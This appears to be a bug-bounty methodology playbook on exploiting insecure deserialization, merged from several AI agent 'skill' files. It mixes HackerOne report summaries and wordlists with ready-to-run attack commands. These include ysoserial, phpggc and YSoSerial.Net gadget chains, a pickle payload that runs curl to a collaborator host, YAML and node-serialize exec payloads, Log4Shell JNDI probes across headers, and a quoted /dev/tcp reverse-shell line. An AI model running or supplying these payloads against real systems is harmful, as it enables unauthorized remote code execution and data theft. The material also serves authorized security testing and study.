- PHP: `unserialize()`, `__wakeup()`, `__destruct()`, `__toString()`, `__get()`, `__call()`, `phar://` streams, `SimpleXMLElement`.
- Python: `pickle.loads`, `cPickle`, `dill`, `yaml.load` (unsafe loader), `marshal.loads`, `shelve`.
- .NET: `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer`, `TypeNameHandling` in Json.NET, ASP.NET ViewState without MAC.
- Ruby: `Marshal.load` / `Marshal.restore` — `Gem::Requirement` and `Gem::Installer` gadget chains.

**Detection payload quick reference:**
- Java universal: `java -jar ysoserial-all.jar URLDNS 'http://<collab>/probe' | base64 -w0`
- Java DNS-blocked: `JRMPClient <your-ip>` with local vs external IP timing comparison.
- PHP property flip: `O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}`
- PHP chain: `./phpggc Laravel/RCE5 system id | base64` (chain names are version-specific — expect trial and error).
- Python: `python3 -c "import pickle,os,base64; class E: ..."` → `__reduce__` → `(os.system, ('curl http://<collab>/p',))`.
- YAML: `!!python/object/apply:os.system ['curl http://<collab>/y']`
- JNDI: `${jndi:ldap://<collab>/a}` in every header/field; escalate with an LDAP → class-load chain for RCE.

**Common reasons a promising chain fails:**
- Wrong library version on the classpath — read the chain source and match versions, or try several chain names in sequence.
- Signed/encrypted cookie — signature or key must be recovered first (debug file, `.env`, `phpinfo()`, default key).
- JDK 16+ module encapsulation — use GadgetBuilder-style payloads with the required `--add-opens` flags.
- `allowed_classes => false` / `ObjectInputFilter` / `SerializationFilter` allowlists — probe which classes survive by injecting benign objects of different types.
- PHP 8 removed implicit phar metadata unserialization — confirm the target PHP version before investing in phar:// chains.

### Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

### Escalation and related chains

### Escalation chains

- Deserialization -> RCE.
- Deserialization -> auth bypass.

### Attacker can add arbitrary data to the blockchain without paying gas

`#396954` · Rootstock Labs · $0 · critical · 2019-09-18 · ▲258
> Summary: Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.

### Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

### Tools and wordlists

### Tools

`ysoserial` · `phpggc` · `marshalsec` · `Burp` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_deserialization.txt` | 76 |
| `~/.local/share/hackerone-reports/wordlists/params_deserialization.txt` | 5 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_deserialization.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_deserialization.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Scanner coverage is thin; decode cookies/tokens and identify the serialization format manually.

```sh
nuclei -u https://target -tags deserialization \
       -severity low,medium,high,critical -rl 40 -o nuclei_deserialization.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
       -rl 40 -o nuclei_deserialization_other.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class deserialization --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class deserialization
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class deserialization
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class deserialization --min-bounty 1000
```

### Related

- `hackerone-rce` (1,399 reports)
- `hackerone-memory-corruption` (892 reports)

### Related

- `rce` (1,399 reports)
- `memory-corruption` (892 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/deserialization/exploiting
2. https://www.hackerone.com/blog/how-serialized-cookies-led-rce-wordpress-website

### Additional notes

### Parameters observed

`id` · `type` · `qid` · `scoretype` · `f.input`

### Account takeover via insecure intent handling

`#2516732` · Basecamp · $0 · medium · 2024-05-30 · ▲136
> By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account.

### SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai

`#1842674` · Krisp · $0 · critical · 2023-02-22 · ▲119
> tenweb-speed-optimizer wordpress plugin by 10web.io, prior to 2.12.22 version was vulnerable to UNAUTHENTICATED SQL injection (in /wp-json/tenwebio/v2/compress-one) which could be chained with insecure deserialization in the plugin to gain RCE. Vendor published the issue as an "authenticated" one (update: wordfence team corrected it !) - here. We would like to thank @mikemyers for reporting it responsibly to us.

### Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]

`#453791` · PayPal · $0 · medium · 2021-04-30 · ▲93
> A Bug Bounty researcher identified an issue where a JSON wrapper could be used to instantiate arbitrary Java objects. This could lead to circumstances where a class called in the PayPal Android app could be read by a malicious app on the same mobile device. A specific user’s session data could potentially be disclosed, including API tokens. PayPal’s investigation found no evidence of abuse due to this bug, and the issue was resolved on November 15, 2019.

### Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce

`#403083` · Automattic · $0 · high · 2019-12-19 · ▲84
> This vulnerability is based on the following exploitation technique: https://blog.ripstech.com/2018/new-php-exploitation-technique/ It is easier to explain this vulnerability by having watched the PoC first: https://www.youtube.com/watch?v=mr3bAOIUwd4 Here is what's happening: 1. Since a valid phar file needs o be uploaded to the server (the extension doesn't matter) I upload the poc.jpg via the media uploader 2.

### Detection Patterns

```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Phase 1 — Java Deserialization (ysoserial)

```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### Phase 2 — PHP Object Injection

```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phase 3 — Python Pickle

```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 3b — PHP phar://, Python YAML, Node deserialization

- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
  ```bash
  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
  # then reach  phar://uploads/poly.jpg/x  via any fs call
  ```
- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
  `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`

### Phase 4 — .NET ViewState

```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI

```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Marshal

```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

---

### Automation

```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Deserialization — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Java -> `rO0AB...` + ysoserial gadget

- PHP -> `O:8:"stdClass":...`

- Python -> `cos\nsystem\n(S'id'\ntR.` pickle

- Ruby -> `\x04\b[` Marshal



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 3× | `$templates` |

| 3× | `__proto__` |

| 2× | `$cache` |

| 2× | `curl -v \ / --proxy https://127.0.0.1:18443 --proxy-insecure \ / --hsts ./hsts-cache.txt \ / http://hsts-probe.test:18080/` |

| 2× | `cf_ssl_is_alive()` |

| 1× | `system('id')` |

| 1× | `$_COOKIE['nc_form_fields']` |

| 1× | `${jdni:ldap://nps.acronis.com.<your-server>/test}` |

| 1× | `ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ / { / zend_object *zobj; / zobj = Z_OBJ_P(object); / if (!zobj` |

| 1× | `curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12` |

| 1× | `Gem::Package.new(body).spec` |

| 1× | `PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini` |

| 1× | `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1` |

| 1× | `\\| Packet type (` |

| 1× | `\\|$$$$$$$$$$$$\\|*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |

| 1× | `$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%` |

| 1× | `\\|$$$$$$$$$$$$*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |

| 1× | `POST /daip/messagebroker/amf HTTP/1.1 / Host: www.███████ / Connection: close / Accept-Encoding: gzip, deflate / Accept: */* / User-Agent: p` |

| 1× | `script.py <collaborator> 80` |

| 1× | `❯ RUBYGEMS_PROXY=true rackup / Puma starting in single mode... / * Puma version: 5.2.2 (ruby 2.7.1-p83) ("Fettisdagsbulle") / * Min threads:` |



## Parameters observed



`id` · `type` · `qid` · `scoretype` · `f.input`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_deserialization.txt` | 76 |

| `~/.local/share/hackerone-reports/wordlists/params_deserialization.txt` | 5 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_deserialization.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_deserialization.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Scanner coverage is thin; decode cookies/tokens and identify the serialization format manually.



```sh

nuclei -u https://target -tags deserialization \

       -severity low,medium,high,critical -rl 40 -o nuclei_deserialization.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \

       -rl 40 -o nuclei_deserialization_other.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# Deserialization — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.

- Decode cookies/params; identify magic bytes (rO0, a:, 8004, etc.).

- Test gadget chains in an authorized, controlled way.

- Check integrity/signature validation and key management.

- Look at queues, caches, and session stores.



## Bypass tricks



- Signed cookies with a weak/known key.

- Filter bypass via encoding or nested serialization.

- Use DNS/HTTP callbacks to confirm gadget execution.



## Deeper checklist



- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.

- Decode cookies/params and identify magic bytes and object structure.

- Test gadget chains with ysoserial/phpggc in a safe, authorized manner.

- Check integrity/signature validation and key management.

- Look for deserialization in message queues, caches, and session stores.

- Demonstrate a controlled impact (DNS callback or command execution).



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Attacker can add arbitrary data to the blockchain without paying gas** — `#396954` · Rootstock Labs · $0 · ▲258

  > https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java L242

- **Account takeover via insecure intent handling** — `#2516732` · Basecamp · $0 · ▲136

  > By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account.

- **SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai** — `#1842674` · Krisp · $0 · ▲119

  > [tenweb-speed-optimizer](https://wordpress.org/plugins/tenweb-speed-optimizer/) wordpress plugin by [10web.io](https://10web.io/), prior to 2.12.22 version was vulnerable to UNAUTHENTICATED SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be…

- **Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]** — `#453791` · PayPal · $0 · ▲93

  > https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/

- **Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce** — `#403083` · Automattic · $0 · ▲84

  > I only displayed the contents of the /etc/passwd file in the PoC video.

- **RCE on Wordpress website** — `#2248328` · Nextcloud · $0 · ▲83

  > https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php L431

- **Two click Account Takeover** — `#3079738` · Basecamp · $0 · ▲77

  > The vulnerability specifically occurs in the `MainActivity` component when processing deeplinks with URL extras containing specific query parameters.

- **[CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day** — `#1425474` · Acronis · $1,000 · ▲76

  > Construct the payload: `${jdni:ldap://nps.acronis.com.<your-server /test}`

- **GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]** — `#198734` · Internet Bug Bounty · $0 · ▲68

  > This means the `$templates` object's handle was set to 5 and stored into objects store, so we can access the `$templates` object and update the `$cache` property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization.

- **insecure deserilize object leads to RCE On Sitecore (CVE-██████████-27218)** — `#3090123` · Mars · $0 · ▲59

  > The vulnerability allows remote code execution (RCE) through unsanitized user input in the ThumbnailsAccessToken header.

- **CVE-2025-24813: Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet** — `#3031518` · Internet Bug Bounty · $4,323 · ▲56

  > - writes enabled for the default servlet (disabled by default)

- **Remote Code Execution through DNN Cookie Deserialization** — `#876708` · U.S. Dept Of Defense · $0 · ▲56

  > You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the…

- **Unsafe yaml load can lead to remote code execution** — `#2467232` · Liberapay · $0 · ▲55

  > https://github.com/liberapay/liberapay.com/blob/master/liberapay/testing/vcr.py L40

- **Remote code execution on rubygems.org** — `#274990` · RubyGems · $1,500 · ▲51

  > When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`.

- **connect.8x8.com: Deserialization Vulnerability  in Automation Builder via Jint→Newtonsoft serializer coercion (TypeNameHandling)** — `#3861550` · 8x8 · $3,000 · ▲49

  > By providing a specially crafted JSON response, an authenticated user could coerce Jint's overload resolution to construct a `JsonSerializer` with attacker-controlled `TypeNameHandling` settings, enabling deserialization of arbitrary .NET types including…

- **Java Deserialization RCE via JBoss on card.starbucks.in** — `#221294` · Starbucks · $0 · ▲48

  > The researcher discovered that a Starbucks online system running on the domain `http://card.starbucks.in/` performs deserialization of java objects that are submitted by users on a specific path belonging to JBOSSMQ without sanitizing/validating the data.

- **CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci** — `#2762119` · MTN Group · $0 · ▲46

  > If everything goes well, following request will return content of win.ini file in response body.

- **Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration** — `#1529790` · Aiven Ltd · $5,000 · ▲45

  > Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS} &/dev/tcp/███/4445<&1"`

- **Loading YAML in Java client can lead to command execution** — `#1167773` · Kubernetes · $1,000 · ▲45

  > I wrote a small post about this report on my blog, you can find it here: https://j0vsec.com/post/cve-2021-25738/

- **Remote Code Execution via Insecure Deserialization in Telerik UI** — `#838196` · U.S. Dept Of Defense · $0 · ▲45

  > - The `sleep 042020160430,40 amd64.dll` is supposed to Sleep(10).

- **Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet on card.starbucks.in** — `#153026` · Starbucks · $0 · ▲42

  > Invokers: https://card.starbucks.in/invoker/EJBInvokerServlet and https://card.starbucks.in/invoker/JMXInvokerServlet

- **[Switch, PIA/MK8DX] Stack buffer overflow and potential RCE in PIA (LAN/LDN, possibly NEX) room info deserialization** — `#2611669` · Nintendo · $0 · ▲36

  > A vulnerability was discovered in Mario Kart 8 Deluxe's incorrect usage of the [`Pia`](https://github.com/kinnay/NintendoClients/wiki/Pia-Overview) P2P networking library, in which implementations of "`CopyAppData`" (See pseudocode below) are sometimes called…

- **Remote Code Execution on ██.8x8.com via .NET VSTATE Deserialization** — `#1391576` · 8x8 · $0 · ▲36

  > Insert payload into ` VSTATE` parameter on the page.

- **CVE-2023-46132** — `#2255968` · Linux Foundation Decentralized Trust · $0 · ▲34

  > `|$$$$$$$$$$$$| |@@@@@@@@@@@@|%%%%%%%%%|` (The vertical lines " | " represent how transactions are separated in a block.)

- **Navgraph confusion allows any 3p app to send and read requests from the server at app.hey.com** — `#2552879` · Basecamp · $0 · ▲31

  > It is possible to send authenticated requests to the server at app.hey.com and read the server's reply by running a malicious app in the same device as the HEY app.

- **RCE via exposed JMX server on jabber.37signals.com/jabber.basecamp.com** — `#1456063` · Basecamp · $100 · ▲30

  > @ian reported that `jabber.37signals.com` and `jabber.basecamp.com` exposed on port `555` an unauthenticated Java JMX server which was vulnerable to RCE.

- **[HTAF4-213] [Pre-submission] Unsafe AMF deserialization (CVE-2017-5641) in Apache Flex BlazeDS at the https://www.███████/daip/messagebroker/amf** — `#728614` · U.S. Dept Of Defense · $0 · ▲28

  > We identified potential unsafe deserialization vulnerability on the `https://www.█████/daip/messagebroker/amf` endpoint.

- **Bundler's RCE with response using Marshal** — `#1119120` · RubyGems · $0 · ▲28

  > In `GET /api/v1/dependencies`, which Bundler uses to check dependencies, the response is `Marshal.dump` instead of `JSON`.

- **Arbitrary File delete via PHAR deserialization** — `#921288` · Concrete CMS · $0 · ▲28

  > With the parameter of filesystem function (`file exists()`, `is dir()`, etc.) under control, this method can be used with `phar://` pseudo-protocol to directly perform deserialization without relying on `unserialize()`[2].

- **Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)** — `#1174185` · U.S. Dept Of Defense · $0 · ▲27

  > This uploads a file (in this case, `testfile.txt`) to the `█████` directory on the target server.



## Case studies



### Attacker can add arbitrary data to the blockchain without paying gas

`#396954` · Rootstock Labs · $0 · critical · 2019-09-18 · ▲258

> Summary: Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.



### Account takeover via insecure intent handling

`#2516732` · Basecamp · $0 · medium · 2024-05-30 · ▲136

> By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account.



### SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai

`#1842674` · Krisp · $0 · critical · 2023-02-22 · ▲119

> tenweb-speed-optimizer wordpress plugin by 10web.io, prior to 2.12.22 version was vulnerable to UNAUTHENTICATED SQL injection (in /wp-json/tenwebio/v2/compress-one) which could be chained with insecure deserialization in the plugin to gain RCE. Vendor published the issue as an "authenticated" one (update: wordfence team corrected it !) - here. We would like to thank @mikemyers for reporting it responsibly to us.



### Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]

`#453791` · PayPal · $0 · medium · 2021-04-30 · ▲93

> A Bug Bounty researcher identified an issue where a JSON wrapper could be used to instantiate arbitrary Java objects. This could lead to circumstances where a class called in the PayPal Android app could be read by a malicious app on the same mobile device. A specific user’s session data could potentially be disclosed, including API tokens. PayPal’s investigation found no evidence of abuse due to this bug, and the issue was resolved on November 15, 2019.



### Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce

`#403083` · Automattic · $0 · high · 2019-12-19 · ▲84

> This vulnerability is based on the following exploitation technique: https://blog.ripstech.com/2018/new-php-exploitation-technique/ It is easier to explain this vulnerability by having watched the PoC first: https://www.youtube.com/watch?v=mr3bAOIUwd4 Here is what's happening: 1. Since a valid phar file needs o be uploaded to the server (the extension doesn't matter) I upload the poc.jpg via the media uploader 2.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class deserialization --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class deserialization

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class deserialization

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class deserialization --min-bounty 1000

```

## Corpus wordlists (mined)

### `params_deserialization.txt`

```text
id
type
qid
scoretype
f.input
```

### `paths_deserialization.txt`

```text
/bug.php
/Telerik.Web.UI.WebResource.axd
/apps/XTRAHome/Telerik.Web.UI.WebResource.axd
/vuln/detail/CVE-2017-10366
/2016/04/java-deserialization-dos-payloads.html
/test
/exploits/48336
/api/v1/dependencies
/nextcloud/index.php/apps/social/@testuser2
/psc/EXPROD/
/RPC
/plugins/tenweb-speed-optimizer/
/wp-json/tenwebio/v2/compress-one
/woocommerce/includes/import/class-wc-product-csv-importer.php
/2018/new-php-exploitation-technique/
/php/array/languages-name-and-code
/newsletter/
/log4j/2.x/download.html
/shell.aspx
/api/v1/gems
/security/cve/cve-2017-7504
/wEylQkAAQAAAP/
/blog/exploit-dotnetnuke-cookie-deserialization/
/item
/post/cve-2021-25738/
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/posts/higherlogic_rce
/daip/messagebroker/amf
/concrete5_exploit.phar
/dashboard/system/files/storage
/phar:/
/██████████/Telerik.Web.UI.WebResource.axd
/█████/Telerik.Web.UI.WebResource.axd
/███/Telerik.Web.UI.WebResource.axd
/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization
/apps/ownbackup
/owncloud/index.php/apps/ownbackup/restore-tables
/apps
/nextcloud/index.php/apps/social/@testuser2/inbox
/www.w3.org
/nextcloud/index.php/apps/social/@testuser2/following
/social
/security
/activitystreams
/nextcloud/index.php/apps/social/@testuser2/followers
/mallory.json
/nextcloud/index.php/apps/social/@mallory
/index.php
/nextcloud/index.php/apps/social/@testuser2/outbox
/nextcloud/index.php/apps/social/inbox
/nextcloud
/v1
/w3id.org
/nextcloud/index.php/apps/social/@testuser2/15446114504147655329
/@mallory
/QIDAQAB
/ns
/forgot-password
/psc/EXPROD_1/
/monitor
/monitor/EXPROD_1
/en/3.2/topics/cache/
/vulnerabilitydetails
/package/cryo
/package/kaiser
/package/funcster
/CN=localhost
/application/files/tmp/test.php
/[concrete5
/hc/en-us/articles/115000350007
/repomanager3/download
/RPC2
/ramdisk/php-fuzz/phuzzer/php-70/sapi/cli/php
/ramdisk/php-fuzz/phuzzer/php-70/
/yaml.txt
```

## Source skills merged into this topic

- `h1skills` — `hackerone-deserialization`
- `hunting` — `deserialization`
- `cbh` — `hunt-deserialization`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
